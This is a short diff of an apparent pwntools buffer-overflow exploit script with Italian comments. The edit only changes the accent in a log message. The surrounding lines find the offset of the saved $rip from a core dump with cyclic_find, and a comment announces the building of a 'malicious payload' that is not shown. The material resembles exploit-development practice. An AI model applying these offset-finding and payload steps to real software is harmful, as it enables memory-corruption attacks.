@@ -20,7 +20,7 @@ def main():
     info("Indirizzo del $rip = %#x", stack)
     pattern = core.read(stack, 4) #riconoscimento del pattern per ottenere poi l'offset
     rip_offset = cyclic_find(pattern) #dimensione del payload
-    info("L'offset del $rip è di %d", rip_offset)
+    info("L'offset del $rip e' di %d", rip_offset)
     p.close()
 
     #Esecuzione finale del programma con costruzione del payload malevolo
